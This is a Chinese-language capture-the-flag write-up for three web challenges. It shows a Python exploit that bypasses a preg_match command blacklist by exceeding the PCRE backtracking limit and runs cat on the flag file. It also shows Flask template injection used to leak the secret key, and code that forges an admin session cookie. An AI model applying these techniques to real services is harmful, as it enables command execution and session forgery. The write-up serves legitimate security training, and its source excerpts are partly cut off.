### rceservice
题目描述：
> We created this web interface to run commands on our servers, but since we
> haven't figured out how to secure it yet we only let you run 'ls'
>
> 
>
> (This problem does not require any brute force or scanning.  
>  We will ban your team if we detect brute force or scanning).
要求用`json`格式传送payload  
我们尝试`ls`：`{"cmd":"ls"}`
题目源码：
    ';
      } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
        echo 'Hacking attempt detected';
      } else {
        echo 'Attempting to run command:';
        $cmd = json_decode($json, true)['cmd'];
        if ($cmd !== NULL) {
          system($cmd);
        } else {
          echo 'Invalid input';
        }
        echo '';
      }
    }
    ?>
暴躁过滤，在线砍人  
但是我们看到了`preg_match`,就会想到p神曾经提到的PRCE，利用如下的exp：
    import requests
    payload = '{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a"*(1000000) + '"}'
    res = requests.post("http://challenges.fbctf.com:8085/", data={"cmd":payload})
    print(res.text)
另一种方法，同样是`preg_match`的问题，由于它会努力去匹配第一行，所以我们可以利用 **多行** 的方法
尝试直接`cat`，但是返回了空白  
我们返回去查看源代码：`putenv('PATH=/home/rceservice/jail');`，jail应用于当前环境，又根据题目描述的提示--“只允许执行ls命令”，即jail包含了执行`ls`的二进制文件，所以我们可以直接拉出`cat`的路径：`"cmd":
"/bin/cat /home/rceservice/flag"`
> 注：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用
### events
题目描述：
> I heard cookies and string formatting are safe in 2019?
>
> 
>
> (This problem does not require any brute force or scanning. We will ban your
> team if we detect brute force or scanning).
登录  
观察cookie：
    ImEi.XP5j-w.rHcMilGKzEg1FYfcEOR6iqa-B9A
似乎有三段，但加密方式未知，密钥未知  
我们尝试提交数据，注意到有三个参数需要提交：  
既然提示了`cookie`和`string
format`，admin是未允许的状态，所以思路是篡改cookie，伪装为admin，继而拿到flag，通常有一个思路是：利用SSTI，获取密钥，然后重新签名生成cookie。所以如何利用SSTI呢？  
通过一番尝试，三个参数中，`event_important`是可利用点
  * 我们输入`__dict__`，成功回显
  * 查找配置文件：`__class__.__init__.__globals__[app].config`  
  * 于是进行签名
    from flask import Flask
    from flask.sessions import SecureCookieSessionInterface
    app = Flask(__name__)
    app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'
    session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    @app.route('/')
    def index():
        print(session_serializer.dumps("admin"))
    index()
将得到的cookie去修改原`user`的cookie即可得到flag
### products manager
题目给出了源码：
  * 在db.php中：
    /*
    INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');
    INSERT INTO products VALUES('messenger', sha256(....), ....);
    INSERT INTO products VALUES('instagram', sha256(....), ....);
    INSERT INTO products VALUES('whatsapp', sha256(....), ....);
    INSERT INTO products VALUES('oculus-rift', sha256(....), ....);
    */
给出了表结构，且提示很明显，再看主页面：  
三个功能，add是添加产品  
view可以查询  
我们再查看view.php:
    if (isset($name) && $name !== ""
            && isset($secret) && $secret !== "") {
        if (check_name_secret($name, hash('sha256', $secret)) === false) {
          return "Incorrect name or secret, please try again";
        }
        $product = get_product($name);
        echo "Product details:";
        echo "" . htmlentities($product['name']) . "";
        echo "" . htmlentities($product['description']) . "";
/db.php::check_name_secret源码如下：
    function check_name_secret($name, $secret) {
      global $db;
      $valid = false;
      $statement = $db->prepare(
        "SELECT name FROM products WHERE name = ? AND secret = ?"
      );
      check_errors($statement);
      $statement->bind_param("ss", $name, $secret);
      check_errors($statement->execute());
      $res = $statement->get_result();
      check_errors($res);